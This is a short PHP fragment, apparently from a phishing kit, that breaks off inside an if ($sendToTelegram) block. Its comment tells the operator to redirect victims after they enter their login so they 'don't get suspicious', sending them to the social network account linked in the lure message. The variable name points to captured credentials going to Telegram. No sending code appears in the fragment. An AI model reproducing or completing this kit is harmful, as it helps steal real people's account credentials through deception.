...
if ($sendToTelegram) {
  /* Redirect after the user logs in, 
  so that the user doesn't get suspicious, 
  use redirect to the social network/account that you linked to when you sent the message to them. */
